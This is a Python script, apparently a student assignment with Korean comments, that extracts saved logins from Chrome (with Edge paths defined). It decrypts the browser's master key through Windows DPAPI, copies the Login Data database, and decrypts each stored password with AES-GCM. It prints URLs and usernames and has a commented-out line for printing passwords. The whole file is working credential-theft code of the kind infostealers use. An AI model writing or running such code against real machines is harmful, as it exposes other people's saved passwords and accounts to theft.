import sqlite3
import os
import glob
import json
import base64
import shutil

try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    pass

os_env = os.environ['USERPROFILE'] + os.sep

# 딕셔너리로 크롬의 로그인 데이터와, 키 경로를 키와 값으로 설정해줌
PATH = {
    'Chrome':        glob.glob(f'{os_env}/AppData/Local/Google/Chrome/User Data/Default/Login Data'),
    'ChromeKeyPath': glob.glob(f'{os_env}/AppData/Local/Google/Chrome/User Data/Local State'),
    'Edge':          glob.glob(f'{os_env}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data'),
    'EdgeKeyPath':   glob.glob(f'{os_env}/AppData/Local/Microsoft/Edge/User Data/Local State')
} 


def decrypt(encryptedValue, key=None):
    try:
        # for over 80 version chrome
        iv = encryptedValue[3:15]   # 난수 이니셜 백터 뺴오기
        payload = encryptedValue[15:]   # 15번 값부터는 암호화 된 key
        cipher = AES.new(key, AES.MODE_GCM, iv) # 복호화 할 수 있는 모듈 만들기
        decrypted = cipher.decrypt(payload) # 복호화 ! key값이 나옴

        decrypted = decrypted[:-16].decode()  # remove suffix bytes # 뒤에서부터 16개 값이 이상한 값이 들어 있어 뺌
        return decrypted
    except:
        # chrome version under 80   # AES와 IV, v10을 사용하는 것은 80버전 이후임, 80 버전 아래는 그냥 DPAPI로만 암호화되어 있음
        under_80_password = win32crypt.CryptUnprotectData(encryptedValue, None, None, None, 0)[1]
        return under_80_password.decode()


def get_aes_key(keyPath):
    with open(keyPath, 'rt', encoding='UTF8') as f: #localstate 파일을 읽기 권한, text 형태로 읽음을 의미
        local_state = f.read()  
        local_state = json.loads(local_state)   # json 형태로 가지고옴
    aes_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])    # 문자열을 가져와 base64를 디코딩--> DPAPT + DPAPI(KEY)가 됨
    aes_key = aes_key[5:]  # removing DPAPI --> DPAPI(KEY)가 됨
    aes_key = win32crypt.CryptUnprotectData(aes_key, None, None, None, 0)[1]   # DPAPI를 복호화

    return aes_key


def pwd_extraction(safeStorageKey, loginData):  # 키와 로그인 데이터의 경로를 받음
    decrypted_list = []

    shutil.copy2(loginData, './login_vault.db') # shutil: 명령어 수행, 로그인 데이터가 잠겨 있을 수 있어서 다른 곳에 복사해 놈

    with sqlite3.connect('./login_vault.db') as database:   # with 구문이 끝나면 이 database를 닫는다 like free
        cursor = database.cursor()  # 데이터 베이스와 상호작용을 위해 cursor 객체 사용
        db_items = cursor.execute(  # SQL 구문을 데이터 베이스 서버에 보내 가져 온것을 db_items에 저장
            'SELECT username_value, password_value, origin_url FROM logins' # logins 테이블로부터 username_value와 password_value, oring_url로 되어 있는 것을 가져온다
        )

    for username, encrypted_pass, url in db_items.fetchall():   #  db_items의 모든 데이터를 가지고 와 for문
        if encrypted_pass and len(username) > 0:    # 암호화된 패스워드 길이와, ID가 없으면 굳이 복호화 할 필요 없음
            decrypted_list.append({     # uri와 id, password 복호화 된 것을 딕셔너리 형태로 decrypted_list 리스트에 삽입
                'origin_url': url,
                'username': username,
                'password': decrypt(encrypted_pass, safeStorageKey)
            })

    return decrypted_list


if __name__ == '__main__':
    # color setting ANSI
    # 터미널에 출력되는 문자에 대해 색상, 두꺼운 글씨 등으로 보이게 하기
    default = "\033[0m"
    green = "\033[32m"
    blue = "\033[34m"
    yellow = "\033[33m"
    red = "\033[31m"
    bold = "\033[1m"


    browser_type = 'Chrome' # 브라우져 타입을 크롬으로 지정(굳이 안해도 되긴 함)
    login_data = PATH.get(browser_type) # login data를 가지고옴
    key_path = PATH.get(browser_type + 'KeyPath')[0]    # local state를 가져옴, 뒤에[0]은 local state도 여러개가 있을 수 있기 때문

    for profile in login_data:
        for i, info in enumerate(pwd_extraction(get_aes_key(key_path), f"{profile}")): # enumerate는 ()튜플 형태로, 인덱스 번호와, 원소를 불러옴 
            print(
                f"{yellow}[{(i + 1)}]{default}{bold} \n"
                f"URL:   {str(info['origin_url'])} \n"
                f"User:  {str(info['username'])} \n"
                #f"Pwd:   {str(info['password'])} \n {default}"
            )

    print(f"{bold}student_ID: {red}20183202{default}")
